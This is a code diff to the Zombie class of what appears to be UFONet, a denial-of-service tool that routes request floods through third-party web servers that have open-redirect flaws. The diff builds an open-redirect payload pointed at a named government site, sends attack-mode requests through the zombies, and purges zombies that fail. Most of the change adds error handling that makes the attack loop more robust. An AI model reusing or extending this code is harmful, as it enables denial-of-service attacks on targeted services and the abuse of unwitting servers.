@@ -48,7 +48,7 @@ class Zombie: # class representing a zombie
             c.setopt(pycurl.URL, self.zombie) # set 'self.zombie' target
             c.setopt(pycurl.NOBODY, 1) # use HEAD
         if self.payload == True:
-            payload = self.zombie + "https://www.whitehouse.gov" #Open Redirect payload [requested by all UFONet motherships ;-)]
+            payload = self.zombie + "https://www.whitehouse.gov" # Open Redirect payload [requested by all UFONet motherships ;-)]
             c.setopt(pycurl.URL, payload) # set 'self.zombie' payload
             c.setopt(pycurl.NOBODY, 0) # use GET
         if self.ufo.external == True:
@@ -170,8 +170,17 @@ class Zombie: # class representing a zombie
                 except:
                     self.connection_failed = True
         if self.ufo.head == True: # HEAD reply
-            code_reply = c.getinfo(pycurl.HTTP_CODE)
-            reply = b.getvalue().decode('utf-8')
+            try:
+                reply = b.getvalue().decode('utf-8')
+            except:
+                try:
+                    reply = b.getvalue()
+                except:
+                    reply = None
+            try:
+                code_reply = c.getinfo(pycurl.HTTP_CODE)
+            except:
+                code_reply = 0
             if reply:
                 if options.verbose:
                     print("[Info] [AI] HEAD Reply:")
@@ -181,30 +190,57 @@ class Zombie: # class representing a zombie
             else:
                 return code_reply
         if self.ufo.external == True: # External reply
-            external_reply = h.getvalue().decode('utf-8')
+            try:
+                external_reply = h.getvalue().decode('utf-8')
+            except:
+                try:
+                    external_reply = h.getvalue()
+                except:
+                    external_reply = None
             if external_reply:
                 if options.verbose:
                     print("[Info] [AI] EXTERNAL Reply:")
                     print("\n"+ external_reply)
             return external_reply
         if self.payload == True: # Payloads reply
-            payload_reply = h.getvalue().decode('utf-8')
+            try:
+                payload_reply = h.getvalue().decode('utf-8')
+            except:
+                try:
+                    payload_reply = h.getvalue()
+                except:
+                    payload_reply = None
             if payload_reply:
                 if options.verbose:
                     print("[Info] [AI] PAYLOAD Reply:")
                     print("\n"+ payload_reply)
             return payload_reply
         if self.attack_mode == True: # Attack mode reply
-            attack_reply = h.getvalue().decode('utf-8')
-            reply_code = c.getinfo(c.RESPONSE_CODE)
+            try:
+                attack_reply = h.getvalue().decode('utf-8')
+            except:
+                try:
+                    attack_reply = h.getvalue()
+                except:
+                    attack_reply = None
+            try:
+                reply_code = c.getinfo(c.RESPONSE_CODE)
+            except:
+                reply_code = 0
+            try:
+                reply_time = c.getinfo(c.TOTAL_TIME)
+            except:
+                reply_time = 0
+            try:
+                reply_size = len(attack_reply)
+            except:
+                reply_size = 0
             if options.verbose:
-                print("[Info] [AI] [Zombies] "+self.zombie+" -> REPLY (HTTP Code: "+ str(reply_code)+" | Time: "+str(c.getinfo(c.TOTAL_TIME))+" | Size: " + str(len(attack_reply))+")")
+                print("[Info] [AI] [Zombies] "+self.zombie+" -> REPLY (HTTP Code: "+ str(reply_code)+" | Time: "+str(reply_time)+" | Size: " + str(reply_size)+")")
                 time.sleep(5) # managing screen (multi-threading flow time compensation)
             if len(attack_reply) == 0:
                 print("[Info] [Zombies] " + self.zombie + " -> FAILED (cannot connect!)")
                 if not self.ufo.options.disablepurge: # when purge mode discard failed zombie
                     self.ufo.discardzombies.append(self.zombie)
                     self.ufo.num_discard_zombies = self.ufo.num_discard_zombies + 1
-            return [c.getinfo(c.RESPONSE_CODE), 
-                    c.getinfo(c.TOTAL_TIME), 
-                    len(attack_reply)]
+            return [reply_code, reply_time, reply_size]
